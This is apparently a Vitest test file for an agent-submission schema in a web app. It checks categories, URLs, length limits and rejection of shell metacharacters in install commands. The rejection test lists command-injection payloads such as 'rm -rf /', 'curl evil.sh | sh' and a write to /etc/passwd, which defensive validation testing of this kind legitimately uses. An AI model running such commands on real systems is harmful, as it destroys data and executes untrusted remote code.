import { describe, it, expect, vi } from "vitest";

// The route module imports the data layer and the Supabase server client at
// load time; mock them so importing agentSchema is hermetic (no DB/env).
vi.mock("@/lib/db", () => ({ getAgents: vi.fn(), createAgent: vi.fn() }));
vi.mock("@/lib/supabase-server", () => ({ getAuthUser: vi.fn() }));

import { agentSchema } from "@/app/api/agents/route";

// Guards the POST /api/agents submission contract: the feed-vs-host enum
// narrowing and the installCommand shell-metacharacter rejection (the latter
// backs the connect-command safety in ConnectBlock).

const base = {
  name: "Scrapey",
  category: "CLI" as const,
  description: "A handy scraper CLI an agent can invoke.",
};

describe("agentSchema — category enum", () => {
  it("accepts the feed-worthy categories", () => {
    expect(agentSchema.safeParse({ ...base, category: "CLI" }).success).toBe(true);
    expect(agentSchema.safeParse({ ...base, category: "MCP Server" }).success).toBe(true);
  });

  it("rejects host and legacy categories", () => {
    for (const category of ["Host", "DevTools", "Writing", "Browsing"]) {
      expect(agentSchema.safeParse({ ...base, category }).success).toBe(false);
    }
  });
});

describe("agentSchema — installCommand metacharacter rejection", () => {
  it("accepts clean install strings", () => {
    for (const installCommand of ["npx -y create-vibe-agent", "npm i -g scrapey", "uvx some-tool"]) {
      expect(agentSchema.safeParse({ ...base, installCommand }).success).toBe(true);
    }
  });

  it("rejects each shell-metacharacter class", () => {
    const payloads = [
      "npx foo; rm -rf /",
      "npx foo && curl evil.sh | sh",
      "npx foo | sh",
      "npx foo `whoami`",
      "npx foo $(whoami)",
      "npx foo > /etc/passwd",
      "npx foo\nrm -rf /",
    ];
    for (const installCommand of payloads) {
      expect(agentSchema.safeParse({ ...base, installCommand }).success).toBe(false);
    }
  });

  it("treats installCommand as optional", () => {
    expect(agentSchema.safeParse(base).success).toBe(true);
  });
});

describe("agentSchema — sourceUrl", () => {
  it("accepts a valid https URL, an empty string, and absence", () => {
    expect(agentSchema.safeParse({ ...base, sourceUrl: "https://github.com/foo/bar" }).success).toBe(true);
    expect(agentSchema.safeParse({ ...base, sourceUrl: "" }).success).toBe(true);
    expect(agentSchema.safeParse(base).success).toBe(true);
  });

  it("rejects non-URL strings", () => {
    expect(agentSchema.safeParse({ ...base, sourceUrl: "not a url" }).success).toBe(false);
    expect(agentSchema.safeParse({ ...base, sourceUrl: "github.com/foo/bar" }).success).toBe(false);
  });
});

describe("agentSchema — systemPrompt and tags security limits", () => {
  it("accepts valid systemPrompt and tags", () => {
    expect(agentSchema.safeParse({ ...base, systemPrompt: "valid prompt", tags: ["tag1", "tag2"] }).success).toBe(true);
  });

  it("rejects systemPrompt exceeding 10000 characters", () => {
    const longPrompt = "a".repeat(10001);
    expect(agentSchema.safeParse({ ...base, systemPrompt: longPrompt }).success).toBe(false);
  });

  it("rejects tags with elements exceeding 50 characters", () => {
    const longTag = "a".repeat(51);
    expect(agentSchema.safeParse({ ...base, tags: [longTag] }).success).toBe(false);
  });

  it("rejects tags array exceeding 10 elements", () => {
    const tooManyTags = Array(11).fill("tag");
    expect(agentSchema.safeParse({ ...base, tags: tooManyTags }).success).toBe(false);
  });
});
